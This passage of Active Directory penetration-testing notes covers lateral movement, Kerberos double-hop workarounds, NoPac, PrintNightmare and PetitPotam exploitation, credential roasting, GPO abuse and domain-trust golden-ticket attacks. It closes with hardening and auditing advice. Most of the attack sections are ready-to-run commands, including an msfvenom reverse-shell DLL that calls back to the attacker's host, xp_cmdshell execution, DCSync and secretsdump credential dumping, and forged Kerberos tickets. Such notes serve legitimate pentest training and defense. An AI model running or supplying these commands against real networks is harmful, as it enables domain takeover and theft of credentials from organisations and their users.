**RDP**:

```powershell
Get-NetLocalGroupMember -ComputerName <HOST> -GroupName "Remote Desktop Users"
```

Check first whether Domain Users as a whole has this (common on jump/RDS hosts — high blast radius). BloodHound pre-built: Find Workstations/Servers where Domain Users can RDP.

**WinRM**:

```powershell
Get-NetLocalGroupMember -ComputerName <HOST> -GroupName "Remote Management Users"
```

Cypher:

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

Connect — Windows: `Enter-PSSession -ComputerName <HOST> -Credential <CRED_OBJ>`. Linux — evil-winrm (https://github.com/Hackplayers/evil-winrm):

```bash
gem install evil-winrm
evil-winrm -i <TARGET_IP> -u <USER>
```

**MSSQL sysadmin** — commonly found via Kerberoasting/spray/Snaffler turning up connection strings. Cypher:

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

PowerUpSQL (cheat sheet: https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet):

```powershell
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
Get-SQLQuery -Verbose -Instance "<HOST>,1433" -username "<DOMAIN>\<USER>" -password "<PASS>" -query 'Select @@version'
```

Linux:

```bash
mssqlclient.py <DOMAIN>/<USER>@<HOST> -windows-auth
```

```sql
enable_xp_cmdshell
xp_cmdshell whoami /priv
```

`SeImpersonatePrivilege` in the output chains straight to SYSTEM via PrintSpoofer/JuicyPotato/RoguePotato.

## KERBEROS "DOUBLE HOP" PROBLEM

Root cause: WinRM/PSRemoting only forwards a TGS for the immediate target — the TGT itself never travels, so a second-hop request (e.g. querying the DC via PowerView from inside the session) has nothing to authenticate with. Password-based auth (PSExec etc.) doesn't hit this since the NTLM hash sits in memory and travels. Confirm with `klist` — only one cached ticket = the problem is live. Unconstrained delegation on the intermediate host sidesteps it entirely.

**Workaround 1 — PSCredential object** (works from evil-winrm):

```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $SecPassword)
Get-DomainUser -SPN -Credential $Cred | select samaccountname
```

Every command needs `-Credential $Cred` re-passed explicitly — not all tools support it.

**Workaround 2 — Register-PSSessionConfiguration** (needs GUI/RDP, not evil-winrm, not Linux PowerShell):

```powershell
Register-PSSessionConfiguration -Name <SESSION_NAME> -RunAsCredential <DOMAIN>\<USER>
Restart-Service WinRM
Enter-PSSession -ComputerName <HOST> -Credential <DOMAIN>\<USER> -ConfigurationName <SESSION_NAME>
```

`klist` now shows a full TGT cached — tools work with zero extra flags from here. Needs an elevated console for `RunAs`.

Other options not covered in depth: CredSSP, port forwarding, sacrificial process injection.

## BLEEDING EDGE VULNERABILITIES

Unpatched orgs = quick wins from recent CVEs. Even "safe" ones can cause instability (PrintNightmare can crash the spooler).

### NoPac (SamAccountName Spoofing) — CVE-2021-42278 + CVE-2021-42287

Rename a computer account (default quota: 10/user) to match a DC's SamAccountName, request tickets under the DC's identity. Requires `ms-DS-MachineAccountQuota > 0`.

```bash
git clone https://github.com/SecureAuthCorp/impacket.git && cd impacket && python setup.py install
git clone https://github.com/Ridter/noPac.git
sudo python3 scanner.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -use-ldap
sudo python3 noPac.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -dc-host <DC_HOSTNAME> -shell --impersonate administrator -use-ldap
```

Or straight to DCSync: add `--impersonate administrator -use-ldap -dump -just-dc-user <DOMAIN>/administrator` in place of `-shell`. Shell runs via smbexec.py (exact paths only, no `cd`) — flagged by AV as `VirTool:Win32/MSPSEexecCommand`. TGT ccache written to disk where run — clean it up.

### PrintNightmare — CVE-2021-34527 / CVE-2021-1675

```bash
git clone https://github.com/cube0x0/CVE-2021-1675.git
pip3 uninstall impacket && git clone https://github.com/cube0x0/impacket && cd impacket && python3 ./setup.py install
rpcdump.py @<DC_IP> | egrep 'MS-RPRN|MS-PAR'
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<OUR_IP> LPORT=<PORT> -f dll > payload.dll
sudo smbserver.py -smb2support CompData /path/to/payload.dll
# msf multi/handler configured to match, then:
sudo python3 CVE-2021-1675.py <DOMAIN>/<USER>:<PASS>@<DC_IP> '\\<OUR_IP>\CompData\payload.dll'
```

### PetitPotam (MS-EFSRPC) — CVE-2021-36942

Unauthenticated (patched version needs auth). Coerces DC to auth over SMB via EFSRPC, relayed to AD CS Web Enrollment to mint a cert for the DC's machine account.

```bash
sudo ntlmrelayx.py -debug -smb2support --target http://<CA_HOST>/certsrv/certfnsh.asp --adcs --template DomainController
python3 PetitPotam.py <OUR_IP> <DC_IP>
```

Also: Mimikatz `misc::efs /server:<DC> /connect:<OUR_IP>`, standalone .exe, or Invoke-PetitPotam.ps1.

```bash
python3 /opt/PKINITtools/gettgtpkinit.py <DOMAIN>/<DC_HOSTNAME>\$ -pfx-base64 <CERT_B64> dc01.ccache
export KRB5CCNAME=dc01.ccache
secretsdump.py -just-dc-user <DOMAIN>/administrator -k -no-pass <DC_HOSTNAME>@<DC_FQDN>
```

Alt: pull the DC's own NT hash via U2U instead of DCSyncing directly:

```bash
python /opt/PKINITtools/getnthash.py -key <AS_REP_KEY> <DOMAIN>/<DC_HOSTNAME>$
secretsdump.py -just-dc-user <DOMAIN>/administrator "<DC_HOSTNAME>$"@<DC_IP> -hashes aad3b435b51404eeaad3b435b51404ee:<NT_HASH>
```

Windows — same cert into Rubeus:

```powershell
.\Rubeus.exe asktgt /user:<DC_HOSTNAME>$ /certificate:<CERT_B64> /ptt
mimikatz # lsadump::dcsync /user:<domain>\krbtgt
```

Mitigation: patch; Extended Protection for Authentication + Require SSL on AD CS web services; disable NTLM on DCs/AD CS (GPO). Certified Pre-Owned whitepaper covers broader AD CS hardening — patching alone isn't sufficient.

## MISCELLANEOUS MISCONFIGURATIONS

**Exchange group membership** — `Exchange Windows Permissions` (not a protected group) has WriteDacl on the domain object → can grant DCSync. `Organization Management` = Exchange's "Domain Admins," full mailbox access. Compromised Exchange servers commonly yield 10s-100s of cached OWA creds in memory.

**PrivExchange** — PushSubscription feature forces the SYSTEM, over-privileged (pre-2019-CU) Exchange service to auth to an attacker-chosen host → relay to LDAP → DCSync. Any authenticated mailbox user, straight to DA.

**Printer Bug (MS-RPRN)** — any domain user forces the spooler (SYSTEM, default on Desktop Experience installs) to auth outbound via `RpcOpenPrinter` + `RpcRemoteFindFirstPrinterChangeNotificationEx`. Relay to LDAP → DCSync, or relay to grant RBCD on an attacker-controlled computer → impersonate any user on the victim host. Cross-forest: compromise a partner-forest host with unconstrained delegation (e.g. a DC) this way, given admin on your own forest's DC and TGT delegation allowed on the trust.

```powershell
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName <TARGET_FQDN>
```

**MS14-068** — forged Kerberos PAC accepted as legit by unpatched KDCs → standard user, fake DA PAC. PyKEK or Impacket. Patching is the only real defense. (HTB box: Mantis.)

**Sniffing LDAP creds** — apps/printers with an LDAP "test connection" admin feature: point it at your host, `nc -lvnp 389`, trigger the test — often cleartext.

**DNS record enumeration** — adidnsdump (https://github.com/dirkjanm/adidnsdump), resolves the full zone as any authenticated user (child-object listing allowed by default) — useful when hostnames are non-descriptive but a DNS record points at the same IP and reveals function:

```bash
adidnsdump -u <domain>\\<user> ldap://<DC_IP>
adidnsdump -u <domain>\\<user> ldap://<DC_IP> -r   # -r resolves records left blank on first pass
```

**Password in Description field**:

```powershell
Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}
```

**PASSWD_NOTREQD** — doesn't guarantee empty password, just that length policy isn't enforced; test each hit, report regardless of outcome:

```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

**SYSVOL scripts** — readable by every authenticated user by default:

```powershell
ls \\<DC>\SYSVOL\<DOMAIN>\scripts
cat \\<DC>\SYSVOL\<DOMAIN>\scripts\<SCRIPT_NAME>
```

Even a stale/disabled password is worth spraying internally — reuse is common.

**GPP passwords** — Groups.xml/drives.xml/printers.xml/services.xml/scheduledtasks.xml; `cpassword` AES-encrypted with a publicly-known Microsoft key. MS14-025 stopped _new_ GPP passwords, does nothing to cached existing files.

```bash
gpp-decrypt <CPASSWORD_VALUE>
crackmapexec smb -L | grep gpp
crackmapexec smb <DC> -u <user> -p <pass> -M gpp_password
crackmapexec smb <DC> -u <user> -p <pass> -M gpp_autologin   # separate issue — Registry.xml autologon creds, never patched
```

**ASREPRoasting** — `DONT_REQ_PREAUTH` accounts hand back an AS-REP encrypted with their own password to anyone, no auth needed:

```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol
.\Rubeus.exe asreproast /user:<USER> /nowrap /format:hashcat
```

```bash
GetNPUsers.py <DOMAIN>/ -dc-ip <DC_IP> -no-pass -usersfile <USERLIST>
```

Kerbrute auto-dumps AS-REPs for any hit during normal `userenum` — free data from a scan already running. `hashcat -m 18200`.

**GPO abuse** — misconfigured delegation (WriteProperty/WriteDacl/full control) over a GPO pushes to every object in whatever OU it's linked to. **Danger**: check `Affected Objects` scope in BloodHound before touching anything — a writable GPO linked to a 1000-computer OU means one action affects all 1000.

```powershell
$sid = Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
Get-GPO -Guid <GPO_GUID>
```

SharpGPOAbuse (https://github.com/FSecureLABS/SharpGPOAbuse) automates the abuse once scope is confirmed safe.

## DOMAIN TRUSTS PRIMER

Types: parent-child (2-way transitive, same forest), cross-link (child-to-child speedup), external (non-transitive, cross-forest, SID-filtered), tree-root (2-way transitive, new tree same forest), forest (transitive, root-to-root), ESAE (bastion forest for AD management).

Transitive = extends through whatever the trusted domain itself trusts (A→B→C means A trusts C). Non-transitive = direct only. Direction: one-way vs bidirectional. M&A trust setups are a classic soft spot — a weaker acquired company's domain can be a backdoor into the parent, frequently unreviewed for security implications.

```powershell
Get-ADTrust -Filter *                # key fields: Direction, IntraForest (child domain), ForestTransitive (external forest)
Get-DomainTrust
Get-DomainTrustMapping               # full trust graph incl. transitively-visible domains
Get-DomainUser -Domain <CHILD_DOMAIN> | select SamAccountName
```

```cmd
netdom query /domain:<domain> trust
netdom query /domain:<domain> dc
netdom query /domain:<domain> workstation
```

BloodHound: `Map Domain Trusts` pre-built query.

## ATTACKING DOMAIN TRUSTS — CHILD → PARENT (WINDOWS)

`sidHistory` legit use = domain migration continuity. SID Filtering isn't enforced _within_ a forest (only cross-forest), so a compromised child domain lets you forge SID history claiming Enterprise Admins — the parent honors it.

**ExtraSids Golden Ticket** — needs: child KRBTGT hash, child domain SID, a target username (doesn't need to exist), child FQDN, parent's Enterprise Admins SID.

```powershell
mimikatz # lsadump::dcsync /user:<CHILD_DOMAIN>\krbtgt
Get-DomainSID
Get-DomainGroup -Domain <PARENT_DOMAIN> -Identity "Enterprise Admins" | select distinguishedname,objectsid
mimikatz # kerberos::golden /user:<FAKE_USER> /domain:<CHILD_DOMAIN_FQDN> /sid:<CHILD_DOMAIN_SID> /krbtgt:<KRBTGT_NTLM_HASH> /sids:<PARENT_EA_SID> /ptt
```

Rubeus:

```powershell
.\Rubeus.exe golden /rc4:<KRBTGT_NTLM_HASH> /domain:<CHILD_DOMAIN_FQDN> /sid:<CHILD_DOMAIN_SID> /sids:<PARENT_EA_SID> /user:<FAKE_USER> /ptt
```

`klist` confirms the ticket landed. Payoff: unrestricted filesystem/DCSync access on the parent DC. Only real invalidation is rotating the KRBTGT password — do this after any engagement that reaches full compromise.

## ATTACKING DOMAIN TRUSTS — CHILD → PARENT (LINUX)

```bash
secretsdump.py <CHILD_FQDN>/<ADMIN_USER>@<CHILD_DC_IP> -just-dc-user <CHILD_DOMAIN>/krbtgt
lookupsid.py <CHILD_FQDN>/<ADMIN_USER>@<CHILD_DC_IP> | grep "Domain SID"
lookupsid.py <CHILD_FQDN>/<ADMIN_USER>@<PARENT_DC_IP> | grep -B12 "Enterprise Admins"
ticketer.py -nthash <KRBTGT_NTLM_HASH> -domain <CHILD_DOMAIN_FQDN> -domain-sid <CHILD_DOMAIN_SID> -extra-sid <PARENT_EA_SID> <FAKE_USER>
export KRB5CCNAME=<FAKE_USER>.ccache
psexec.py <CHILD_DOMAIN_FQDN>/<FAKE_USER>@<PARENT_DC_FQDN> -k -no-pass -target-ip <PARENT_DC_IP>
```

Automated end-to-end: `raiseChild.py -target-exec <PARENT_DC_IP> <CHILD_DOMAIN_FQDN>/<ADMIN_USER>`. Understand the manual steps first — if the automated run breaks partway, you need to know what it was attempting to recover cleanly.

## ATTACKING DOMAIN TRUSTS — CROSS-FOREST (WINDOWS)

**Cross-forest Kerberoasting**:

```powershell
Get-DomainUser -SPN -Domain <TARGET_FOREST_DOMAIN> | select SamAccountName
.\Rubeus.exe kerberoast /domain:<TARGET_FOREST_DOMAIN> /user:<SPN_USER> /nowrap
```

**Admin password reuse across forests** — same admin team managing both sides of a bidirectional trust often means a cracked privileged account name in Domain A (`adm_bob.smith`) is worth trying against a similarly-named account in Domain B (`bsmith_admin`).

**Foreign group membership** — only Domain Local groups permit cross-forest members; a Domain Admin from Forest A in Forest B's built-in Administrators is a direct escalation path:

```powershell
Get-DomainForeignGroupMember -Domain <TARGET_FOREST_DOMAIN>
Convert-SidToName <SID>
Enter-PSSession -ComputerName <TARGET_FOREST_DC> -Credential <HOME_FOREST_DOMAIN>\<ADMIN_USER>
```

**SID History cross-forest abuse** — same Golden Ticket mechanism, injected against a migrated account's SID history if SID Filtering wasn't enabled at migration time.

## ATTACKING DOMAIN TRUSTS — CROSS-FOREST (LINUX)

```bash
GetUserSPNs.py -target-domain <TARGET_FOREST_DOMAIN> <HOME_DOMAIN>/<USER>
GetUserSPNs.py -request -target-domain <TARGET_FOREST_DOMAIN> <HOME_DOMAIN>/<USER>
```

Dead end after cracking in the target forest? Still worth one spray attempt of that password back in your home forest against other service accounts under common admin ownership.

**bloodhound-python across multiple domains** — needs real DNS resolution, not just `/etc/hosts` entries:

```bash
# /etc/resolv.conf
domain <DOMAIN_FQDN>
nameserver <DC_IP>
```

```bash
bloodhound-python -d <DOMAIN_FQDN> -dc <DC_HOSTNAME> -c All -u <USER> -p <PASS>
zip -r <NAME>.zip *.json
```

Repeat with the second domain's resolv.conf entries, upload both to the same BloodHound DB, then run `Users with Foreign Domain Group Membership` selecting your home domain as source.

## HARDENING ACTIVE DIRECTORY

Baseline hygiene beats any EDR/SIEM purchase — logging + documentation discipline is the actual foundation.

**Document & audit regularly**: naming conventions, DNS/DHCP config, every GPO + scope, FSMO role assignment, full app inventory, host inventory + location, all trust relationships, who holds elevated permissions.

**People**:

- Strong password policy + dictionary/word filter (block company name, seasons, months)
- Rotate service account passwords
- No local admin for standard users without real business need
- Disable default RID-500 admin, use a separate LAPS-rotated admin account
- Tiered administration
- Trim bloated privileged groups
- **Protected Users group** (2012 R2+): no constrained/unconstrained delegation, no cached CredSSP/Digest plaintext, no NTLM/DES/RC4 auth, no cached long-term keys post-TGT, TGT capped at original 4hr lifetime. Caution: stage/test — can cause unexpected lockouts.

```powershell
Get-ADGroup -Identity "Protected Users" -Properties Name,Description,Members
```

- Disable Kerberos delegation on admin accounts explicitly

**Process**:

- Formal asset management (tagging, periodic inventory)
- Access control policy (provisioning/deprovisioning), MFA
- Standardized provisioning (gold images) and decommissioning
- AD cleanup policy: ex-employee accounts deleted vs disabled? Stale-record process? Legacy service decommission process (e.g. proper Exchange removal)?

**Technology**:

- BloodHound/PingCastle/Grouper as periodic self-audit
- No passwords in description fields; audit SYSVOL scripts for creds
- gMSA/MSA over standard service accounts (kills Kerberoasting)
- Disable Unconstrained Delegation where not required
- Jump hosts only for DC access
- `ms-DS-MachineAccountQuota = 0` (blocks NoPac and RBCD paths)
- Disable Print Spooler where not needed (kills Printer Bug)
- Disable NTLM on DCs where feasible
- Extended Protection for Authentication + Require SSL on AD CS
- SMB signing + LDAP signing enabled
- `RestrictNullSessAccess = 1` (blocks null-session enumeration)
- Regular pentests (quarterly ideal, annual minimum); test backups/DR plans for real

**MITRE ATT&CK mapping**:

```
External Recon          T1589      mostly undetectable — scrub doc metadata, careful job postings
Internal Recon          T1595      NIDS/firewall anomaly detection; don't respond to unsolicited broadcast/ICMP
LLMNR/NBT-NS Poisoning   T1557      SMB signing + encrypted transport breaks relay
Password Spraying        T1110.003  logging/monitoring catches easily; policy + lockout + MFA
Credentialed Enumeration TA0006     hard to stop once creds valid; baseline normal behavior
Living Off the Land      N/A        AppLocker + behavioral baselining, no single fix
Kerberoasting            T1558.003  gMSA is the real fix; AES-only + strong passwords mitigate, don't eliminate
```

## ADDITIONAL AD AUDITING TECHNIQUES

**AD Explorer** (Sysinternals) — browse/edit AD live, or snapshot for offline analysis and before/after diffing. File > Create Snapshot.

**PingCastle** (https://www.pingcastle.com) — CMMI-based maturity/risk scoring, not just raw enumeration data. Interactive TUI, `healthcheck` = default/main scan; `scanner` submenu: aclcheck, antivirus, computerversion, foreignusers, laps_bitlocker, localadmin, nullsession, nullsession-trust, oxidbindings, remote, share, smb, smb3querynetwork, spooler, startup, zerologon. Output includes overall domain risk score + anomalies table.

**Group3r** (https://github.com/Group3r/Group3r) — GPO-specific misconfig finder, runs from any domain user context:

```cmd
group3r.exe -f <OUTPUT_FILE.log>
```

Output nesting: no indent = GPO, one indent = policy setting, further indent = specific finding.

**ADRecon** (https://github.com/adrecon/ADRecon) — broad one-shot export (domain, forest, trusts, sites, password policy incl. fine-grained, DCs, users+SPNs, groups+membership changes, OUs, GPOs, DNS zones/records, printers, computers+SPNs, LAPS, BitLocker recovery keys):

```powershell
.\ADRecon.ps1
```

Needs Excel installed for the polished report (otherwise raw CSVs only); GPO output needs the GroupPolicy PowerShell module. Regenerate the Excel report later from elsewhere: `-GenExcel <report_folder>`.